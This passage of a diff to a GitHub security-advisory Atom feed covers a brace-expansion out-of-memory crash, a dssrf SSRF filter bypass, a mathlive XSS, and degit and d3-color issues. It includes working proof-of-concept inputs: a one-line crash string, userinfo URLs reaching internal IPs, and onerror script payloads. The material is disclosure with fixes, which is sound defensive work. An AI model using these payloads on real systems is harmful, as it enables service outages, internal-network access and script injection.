+arrays combined at each brace group — exhausts memory and crashes the Node
+process with an <strong>uncatchable</strong> out-of-memory error. <code>try/catch</code> around
+<code>expand()</code> does not help: the fatal error terminates the process.</p>
+<p>A ~7.5 KB input (<code>'{a,b}'.repeat(1500)</code>) is enough to crash a default Node
+process.</p>
+<h3 id="details">Details</h3>
+<p>For <code>N</code> chained brace groups such as <code>'{a,b}'.repeat(N)</code>:</p>
+<ul>
+<li>the result count is <code>2^N</code>, immediately capped at <code>max</code> (<code>100_000</code>), so the
+<code>max</code> protection appears to hold, but</li>
+<li>each result is <code>N</code> characters long, so the total output size is
+<code>max × N</code> characters, which grows without bound in <code>N</code>.</li>
+</ul>
+<p><code>expand_</code> combines each brace set with the fully-expanded tail:</p>
+<pre><code class="language-js">const post = m.post.length ? expand_(m.post, max, false) : ['']
+...
+for (let j = 0; j &lt; N.length; j++) {
+  for (let k = 0; k &lt; post.length &amp;&amp; expansions.length &lt; max; k++) {
+    const expansion = pre + N[j] + post[k]   // grows one group longer per level
+    ...
+    expansions.push(expansion)
+  }
+}
+</code></pre>
+<p>The loop guard <code>expansions.length &lt; max</code> limits how many strings are built, but
+nothing limits how long they get. Each recursion level materializes another
+array of up to <code>max</code> strings, one character longer than the level below, and —
+because V8 represents <code>pre + N[j] + post[k]</code> as a cons-string (rope) that
+references <code>post[k]</code> — those intermediate strings stay reachable through the
+whole chain. Memory therefore scales with <code>max × N</code>.</p>
+<p>Measured on <code>5.0.7</code> (<code>'{a,b}'.repeat(N)</code>, default <code>max</code>):</p>
+<table>
+<thead>
+<tr>
+<th>groups (N)</th>
+<th>input bytes</th>
+<th>result count</th>
+<th>peak RSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>20</td>
+<td>100</td>
+<td>100,000</td>
+<td>~80 MB</td>
+</tr>
+<tr>
+<td>50</td>
+<td>250</td>
+<td>100,000</td>
+<td>~214 MB</td>
+</tr>
+<tr>
+<td>100</td>
+<td>500</td>
+<td>100,000</td>
+<td>~409 MB</td>
+</tr>
+<tr>
+<td>300</td>
+<td>1,500</td>
+<td>100,000</td>
+<td>~1,148 MB</td>
+</tr>
+<tr>
+<td>1500</td>
+<td>7,500</td>
+<td>—</td>
+<td><strong>OOM crash</strong></td>
+</tr>
+</tbody></table>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<pre><code class="language-js">const { expand } = require('brace-expansion')
+
+// ~7.5 KB input — crashes the process with a fatal, uncatchable OOM:
+//   FATAL ERROR: ... JavaScript heap out of memory
+try {
+  expand('{a,b}'.repeat(1500))
+} catch (e) {
+  // never reached — the process is already dead
+}
+</code></pre>
+<h3 id="impact">Impact</h3>
+<p>Any application that passes attacker-influenced strings to
+<code>brace-expansion.expand()</code> — directly, or transitively via <code>minimatch</code> / <code>glob</code>
+brace patterns — can be crashed by a small request. Because the failure is a
+fatal V8 out-of-memory error rather than a thrown exception, it cannot be caught
+and it takes down the whole worker/process, denying service.</p>
+<h3 id="remediation">Remediation</h3>
+<p>Upgrade to a patched release. The fix bounds the total number of characters a
+single <code>expand()</code> call may accumulate (<code>EXPANSION_MAX_LENGTH</code>, default
+<code>4_000_000</code>, configurable via a new <code>maxLength</code> option), applied inside the
+output-building loops so intermediate arrays are bounded too. Once the limit is
+reached, output is truncated — consistent with how <code>max</code> already truncates —
+instead of growing without bound. The limit sits well above any realistic
+expansion (100,000 results hitting <code>max</code> measure ~1M characters), so legitimate
+input is unaffected.</p>
+<p>After the fix, <code>'{a,b}'.repeat(1500)</code> returns a bounded, truncated result in
+~0.7 s using ~340 MB and never crashes, including under a constrained 512 MB
+heap.</p>
+<p>The fix bounds memory but the algorithm still rebuilds intermediate arrays at
+each level (roughly <code>O(N × maxLength)</code> work on this input class). A streaming
+rewrite that produces output in <code>O(total output size)</code> can be a non-urgent
+follow-up.</p>
+<p>If immediate upgrade isn't possible, avoid passing untrusted input to
+<code>expand()</code> / glob brace patterns, or pass a small explicit <code>max</code> <strong>and</strong>
+<code>maxLength</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg">https://github.com/juliangruber/brace-expansion/security/advisories/GHSA-mh99-v99m-4gvg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-14257">https://nvd.nist.gov/vuln/detail/CVE-2026-14257</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5">https://github.com/juliangruber/brace-expansion/commit/a1bd33999ea75262c4749fff3bbb0d1372bd07b5</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion">https://github.com/juliangruber/brace-expansion</a></li>
+<li><a href="https://www.npmjs.com/package/brace-expansion">https://www.npmjs.com/package/brace-expansion</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/129">https://github.com/juliangruber/brace-expansion/pull/129</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/130">https://github.com/juliangruber/brace-expansion/pull/130</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/pull/136">https://github.com/juliangruber/brace-expansion/pull/136</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d">https://github.com/juliangruber/brace-expansion/commit/139d015104e71433ad52a41d19467c48ecbb2c7d</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031">https://github.com/juliangruber/brace-expansion/commit/cb4b9e47cc2ec777c14b2b4492fb431a56f6a031</a></li>
+<li><a href="https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb">https://github.com/juliangruber/brace-expansion/commit/d13ff455a58b0d56704f0111e3c2a0b16ceb06eb</a></li>
+<li><a href="https://github.com/advisories/GHSA-mh99-v99m-4gvg">https://github.com/advisories/GHSA-mh99-v99m-4gvg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mh99-v99m-4gvg</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-24T21:53:14.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[jodit] Jodit has cross-site scripting (XSS) via <script> nested in SVG that bypasses clean-html sanitization]]></title>
         <id>https://github.com/advisories/GHSA-45qg-252v-3f7p</id>
@@ -1237,204 +1875,5 @@ message: Alert for Team
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-07-30T20:57:24.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[d3-color] d3-color vulnerable to ReDoS]]></title>
-        <id>https://github.com/advisories/GHSA-36jr-mh4h-2g58</id>
-        <link href="https://github.com/advisories/GHSA-36jr-mh4h-2g58"/>
-        <updated>2026-07-30T20:37:28.000Z</updated>
-        <content type="html"><![CDATA[<p>The d3-color module provides representations for various color spaces in the browser. Versions prior to 3.1.0 are vulnerable to a Regular expression Denial of Service. This issue has been patched in version 3.1.0. There are no known workarounds.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/d3/d3-color/pull/100">https://github.com/d3/d3-color/pull/100</a></li>
-<li><a href="https://github.com/d3/d3-color/releases/tag/v3.1.0">https://github.com/d3/d3-color/releases/tag/v3.1.0</a></li>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592">https://security.snyk.io/vuln/SNYK-JS-D3COLOR-1076592</a></li>
-<li><a href="https://github.com/advisories/GHSA-36jr-mh4h-2g58">https://github.com/advisories/GHSA-36jr-mh4h-2g58</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-36jr-mh4h-2g58</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2022-09-29T14:12:55.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[degit] degit has a Command Injection issue]]></title>
-        <id>https://github.com/advisories/GHSA-77c7-pq4r-6mcq</id>
-        <link href="https://github.com/advisories/GHSA-77c7-pq4r-6mcq"/>
-        <updated>2026-07-30T18:35:52.000Z</updated>
-        <content type="html"><![CDATA[<p>Versions of the package degit before 2.8.6, from 3.0.0 and before 3.3.1 are vulnerable to Command Injection due to improper sanitisation of user input for git shell commands directly invoked with exec() method by _cloneWithGit() and fetchRefs() functions. An attacker can execute arbitrary operating system commands as the process user by supplying a specially crafted git repository name.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11572">https://nvd.nist.gov/vuln/detail/CVE-2026-11572</a></li>
-<li><a href="https://github.com/Rich-Harris/degit/commit/4ac99e4a4c3f53ca3b5c997bcd7542742ad0c443">https://github.com/Rich-Harris/degit/commit/4ac99e4a4c3f53ca3b5c997bcd7542742ad0c443</a></li>
-<li><a href="https://github.com/Rich-Harris/degit/commit/d55bfd7cea79c0b387f69ec8477b6c34abf9f226">https://github.com/Rich-Harris/degit/commit/d55bfd7cea79c0b387f69ec8477b6c34abf9f226</a></li>
-<li><a href="https://gist.github.com/badp3te/cf22a939eedbd3d8ade9123827d61639">https://gist.github.com/badp3te/cf22a939eedbd3d8ade9123827d61639</a></li>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-DEGIT-17116207">https://security.snyk.io/vuln/SNYK-JS-DEGIT-17116207</a></li>
-<li><a href="https://github.com/advisories/GHSA-77c7-pq4r-6mcq">https://github.com/advisories/GHSA-77c7-pq4r-6mcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-77c7-pq4r-6mcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-09T06:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[degit] degit has a Command Injection issue]]></title>
-        <id>https://github.com/advisories/GHSA-77c7-pq4r-6mcq</id>
-        <link href="https://github.com/advisories/GHSA-77c7-pq4r-6mcq"/>
-        <updated>2026-07-30T18:35:52.000Z</updated>
-        <content type="html"><![CDATA[<p>Versions of the package degit before 2.8.6, from 3.0.0 and before 3.3.1 are vulnerable to Command Injection due to improper sanitisation of user input for git shell commands directly invoked with exec() method by _cloneWithGit() and fetchRefs() functions. An attacker can execute arbitrary operating system commands as the process user by supplying a specially crafted git repository name.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11572">https://nvd.nist.gov/vuln/detail/CVE-2026-11572</a></li>
-<li><a href="https://github.com/Rich-Harris/degit/commit/4ac99e4a4c3f53ca3b5c997bcd7542742ad0c443">https://github.com/Rich-Harris/degit/commit/4ac99e4a4c3f53ca3b5c997bcd7542742ad0c443</a></li>
-<li><a href="https://github.com/Rich-Harris/degit/commit/d55bfd7cea79c0b387f69ec8477b6c34abf9f226">https://github.com/Rich-Harris/degit/commit/d55bfd7cea79c0b387f69ec8477b6c34abf9f226</a></li>
-<li><a href="https://gist.github.com/badp3te/cf22a939eedbd3d8ade9123827d61639">https://gist.github.com/badp3te/cf22a939eedbd3d8ade9123827d61639</a></li>
-<li><a href="https://security.snyk.io/vuln/SNYK-JS-DEGIT-17116207">https://security.snyk.io/vuln/SNYK-JS-DEGIT-17116207</a></li>
-<li><a href="https://github.com/advisories/GHSA-77c7-pq4r-6mcq">https://github.com/advisories/GHSA-77c7-pq4r-6mcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-77c7-pq4r-6mcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-09T06:31:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[dssrf] dssrf has an SSRF bypass with remove_at_symbol_in_string]]></title>
-        <id>https://github.com/advisories/GHSA-cg4g-m8jx-vjv2</id>
-        <link href="https://github.com/advisories/GHSA-cg4g-m8jx-vjv2"/>
-        <updated>2026-07-30T21:23:16.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p><code>is_url_safe</code> in v1.0.3 contains an SSRF bypass. <code>remove_at_symbol_in_string</code> is applied to the raw URL string <strong>before</strong> <code>new URL()</code> parses it. This strips the <code>@</code> that separates userinfo from host, corrupting the hostname so internal IPs are never checked.</p>
-<h2 id="vulnerability">Vulnerability</h2>
-<p>In <code>helpers.ts</code>, <code>is_url_safe</code> does:</p>
-<pre><code class="language-ts">u = remove_at_symbol_in_string(u);   // strips ALL '@' from the raw string
-// ...
-const parsed = new URL(u);
-const hostname = parsed.hostname;    // resolved from the corrupted string
-</code></pre>
-<h3 id="what-happens-step-by-step">What happens step by step</h3>
-<p>Input: <code>http://evil.com@127.0.0.1/</code></p>
-<ol>
-<li><code>remove_at_symbol_in_string</code> → <code>http://evil.com127.0.0.1/</code></li>
-<li><code>new URL(...)</code> → <code>hostname = "evil.com127.0.0.1"</code></li>
-<li>Not a bare IP, not IPv6 → passes all IP checks</li>
-<li><code>is_hostname_resolve_to_internal_ip("evil.com127.0.0.1")</code> → NXDOMAIN → returns false</li>
-<li><strong>Result: <code>true</code> (safe)</strong> — but any HTTP client using the <em>original</em> URL connects to <code>127.0.0.1</code></li>
-</ol>
-<h3 id="proof-of-concept">Proof of Concept</h3>
-<pre><code class="language-js">import nock from 'nock';
-import { got } from 'got';
-import { is_url_safe } from 'dssrf';
-
-// Simulate an internal server at 10.0.0.1 that returns secret data
-nock('http://10.0.0.1:80').persist().get('/').reply(200, 'SECRET_DATA');
-
-const BYPASS_URL = 'http://2@10.0.0.1/';
-const PLAIN_URL  = 'http://10.0.0.1/';
-
-// dssrf should block both — it only blocks the plain one
-console.log('--- dssrf validator ---');
-console.log(`is_url_safe('${PLAIN_URL}')   =`, await is_url_safe(PLAIN_URL),  '← correctly blocked');
-console.log(`is_url_safe('${BYPASS_URL}') =`, await is_url_safe(BYPASS_URL), '← ⚠️  BYPASSED (should be false)');
-
-// HTTP client with the bypass URL — gets SECRET_DATA back from 10.0.0.1
-console.log('\n--- HTTP client ---');
-try {
-  const res = await got(BYPASS_URL, { retry: { limit: 0 } });
-  console.log(`got('${BYPASS_URL}') response:`, res.body, '← ⚠️  VULNERABLE');
-} catch (e) {
-  console.log(`got('${BYPASS_URL}') blocked:`, e.message);
-}
-</code></pre>
-<h2 id="root-cause">Root Cause</h2>
-<p><code>@</code> in a URL separates <code>userinfo</code> (credentials) from <code>host</code>. Stripping it from the raw string before parsing destroys that boundary. The fix is to <strong>reject any URL that contains a userinfo component</strong> after parsing.</p>
-<h2 id="suggested-fix">Suggested Fix</h2>
-<p>Remove the <code>remove_at_symbol_in_string</code> call from <code>is_url_safe</code> and add a userinfo check after <code>new URL()</code>:</p>
-<pre><code class="language-ts">const parsed = new URL(u);
-
-// Reject userinfo — '@' in authority is a classic SSRF bypass vector
-if (parsed.username !== "" || parsed.password !== "") {
-  return false;
-}
-</code></pre>
-<p>A working patch verified against 15 vectors (all internal IPv4 ranges, IMDS, IPv6 via userinfo, and legitimate public URLs) is ready to submit as a PR.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Affected version</strong>: 1.0.3 (latest)</li>
-<li><strong>Bypasses</strong>: all internal IPv4 ranges, IPv6 loopback/ULA/link-local, AWS IMDS (<code>169.254.169.254</code>), any internal hostname via userinfo prefix</li>
-<li><strong>Note</strong>: The GHSA-8p33-q827-ghj5 advisory patched version (<code>1.0.3</code>) should be updated since this vector was not covered by that fix</li>
-</ul>
-<p>Users are strongly advised to upgrade to dssrf 1.0.4</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-cg4g-m8jx-vjv2">https://github.com/HackingRepo/dssrf-js/security/advisories/GHSA-cg4g-m8jx-vjv2</a></li>
-<li><a href="https://github.com/HackingRepo/dssrf-js/issues/97">https://github.com/HackingRepo/dssrf-js/issues/97</a></li>
-<li><a href="https://github.com/HackingRepo/dssrf-js/pull/98">https://github.com/HackingRepo/dssrf-js/pull/98</a></li>
-<li><a href="https://github.com/HackingRepo/dssrf-js/commit/9211f91bf532433a1a1b27d946571546a63664b3">https://github.com/HackingRepo/dssrf-js/commit/9211f91bf532433a1a1b27d946571546a63664b3</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54722">https://nvd.nist.gov/vuln/detail/CVE-2026-54722</a></li>
-<li><a href="https://github.com/advisories/GHSA-cg4g-m8jx-vjv2">https://github.com/advisories/GHSA-cg4g-m8jx-vjv2</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-cg4g-m8jx-vjv2</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-30T16:26:52.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mathlive] mathlive's Lack of Escaping of HTML allows for XSS]]></title>
-        <id>https://github.com/advisories/GHSA-fm7p-gw32-828p</id>
-        <link href="https://github.com/advisories/GHSA-fm7p-gw32-828p"/>
-        <updated>2026-07-29T17:21:27.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>Despite the 0.104.0 patch escaping attribute-bearing constructs (<code>\htmlData</code>, <code>\href</code>), text-content reflection was missed. The <code>\text{}</code>, <code>\mbox{}</code> commands accept arbitrary characters in their body and emit them raw and unescaped into both the HTML markup and the MathML output, leading to XSS.</p>
-<h3 id="details">Details</h3>
-<p><code>Box.toMarkup</code> at <code>src/core/box.ts:356</code> concatenates <code>this.value</code> into the rendered span without HTML-escaping. In text mode any literal character (<code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>"</code>) is wrapped into a <code>TextAtom</code> whose <code>value</code> is the raw codepoint and lands in the markup unchanged. The MathML serializer at <code>src/formats/atom-to-math-ml.ts</code> is independently broken: <code>xmlEscape</code> deliberately omits the <code>&amp;</code> rule, and <code>scanText</code>, <code>case 'text'</code>, and the <code>mode === 'text'</code> early return all emit <code>atom.value</code> raw.</p>
-<p>Both outputs flow into <code>innerHTML</code> sinks via the public API. <code>&lt;math-span&gt;</code> / <code>&lt;math-div&gt;</code> (<code>src/public/math-static-elements.ts:331,407</code>) bypass <code>MathfieldElement.createHTML</code> entirely. The editor and SSR paths route through <code>createHTML</code>, but its default value is the identity function (<code>src/public/mathfield-element.ts:789</code>).</p>
-<h3 id="poc">PoC</h3>
-<ol>
-<li>Go to <a href="https://mathlive.io/mathfield/demo/">https://mathlive.io/mathfield/demo/</a></li>
-<li>open DevTools console and paste:</li>
-</ol>
-<pre><code class="language-js">const s = document.createElement('math-span');
-s.style.display = 'block';
-s.textContent = '\\text{&lt;img src=x onerror=alert(1)&gt;}';
-document.body.appendChild(s);
-s.scrollIntoView();
-</code></pre>
-<p>Equivalent payloads: <code>\mbox{&lt;img src=x onerror=alert(1)&gt;}</code></p>
-<p>or</p>
-<pre><code class="language-js">import { convertLatexToMarkup } from 'mathlive';
-document.body.innerHTML = convertLatexToMarkup('\\text{&lt;img src=x onerror=alert(1)&gt;}');
-</code></pre>
-<h3 id="impact">Impact</h3>
-<p>MathLive users who render untrusted mathematical expressions can encounter malicious input that runs arbitrary JavaScript.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/arnog/mathlive/security/advisories/GHSA-fm7p-gw32-828p">https://github.com/arnog/mathlive/security/advisories/GHSA-fm7p-gw32-828p</a></li>
-<li><a href="https://github.com/arnog/mathlive/issues/3028">https://github.com/arnog/mathlive/issues/3028</a></li>
-<li><a href="https://github.com/arnog/mathlive/commit/5fe1c46153883f9ec0249a5c8c34e64aaae9cfb8">https://github.com/arnog/mathlive/commit/5fe1c46153883f9ec0249a5c8c34e64aaae9cfb8</a></li>
-<li><a href="https://github.com/advisories/GHSA-fm7p-gw32-828p">https://github.com/advisories/GHSA-fm7p-gw32-828p</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fm7p-gw32-828p</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-07-29T17:21:26.000Z</published>
     </entry>
 </feed>
